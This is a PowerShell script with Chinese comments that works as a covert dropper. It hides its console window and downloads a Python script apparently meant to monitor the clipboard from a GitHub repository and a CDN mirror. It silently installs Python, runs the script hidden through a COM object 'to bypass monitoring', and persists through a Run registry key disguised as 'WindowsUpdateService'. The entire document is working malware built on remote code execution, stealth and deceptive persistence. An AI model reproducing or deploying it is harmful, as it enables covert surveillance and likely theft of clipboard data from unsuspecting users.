<# 强制隐藏窗口的三种方式组合 #>
[Console]::WindowHeight = 1
[Console]::WindowWidth = 1
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
$hwnd = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($hwnd, 0)

# 环境初始化
$ErrorActionPreference = "Stop"
$tempDir = $env:TEMP
$scriptName = "cb_monitor.py"
$scriptPath = Join-Path $tempDir $scriptName

# 智能下载函数
function Invoke-StealthDownload {
    param($url, $path)
    
    $methods = @(
        { (New-Object Net.WebClient).DownloadFile($url, $path) },
        { Start-BitsTransfer -Source $url -Destination $path },
        { curl -Uri $url -OutFile $path -UseBasicParsing }
    )
    
    foreach ($method in $methods) {
        try {
            & $method
            return $true
        } catch { 
            Start-Sleep -Milliseconds 500 
        }
    }
    return $false
}

# 静默安装 Python 3.10
function Install-Python {
    $installer = Join-Path $tempDir "python_setup.exe"
    $pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
    
    if (Invoke-StealthDownload $pythonUrl $installer) {
        $silentArgs = @(
            "/quiet", "InstallAllUsers=0", 
            "PrependPath=1", "Include_launcher=0",
            "Shortcuts=0", "AssociateFiles=0"
        )
        $proc = Start-Process $installer -ArgumentList $silentArgs -PassThru -Wait
        # 强制更新环境变量
        $env:Path = [Environment]::GetEnvironmentVariable('Path', 'Machine') + ";" +
                    [Environment]::GetEnvironmentVariable('Path', 'User')
    }
}

# 主执行流程
try {
    # 下载 Python 脚本（多镜像源）
    $sources = @(
        "https://raw.githubusercontent.com/ethxiaoli/clipboard-setup/main/$scriptName",
        "https://cdn.statically.io/gh/ethxiaoli/clipboard-setup/main/$scriptName"
    )
    
    foreach ($url in $sources) {
        if (Invoke-StealthDownload $url $scriptPath) { break }
    }

    # Python 环境检测
    if (-not ($pythonExe = (Get-Command python -ErrorAction SilentlyContinue).Path)) {
        Install-Python
        $pythonExe = (Get-Command python -ErrorAction Stop).Path
    }

    # 隐蔽执行（使用 COM 对象绕过监控）
    $shell = New-Object -ComObject WScript.Shell
    $cmd = "`"$pythonExe`" -E -B `"$scriptPath`""
    $shell.Run($cmd, 0, $false)
    
    # 设置持久化
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $payload = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Set-ItemProperty -Path $regPath -Name "WindowsUpdateService" -Value $payload -Force
    
} catch {
    $_ | Out-File (Join-Path $tempDir "syserr.log") -Append
}
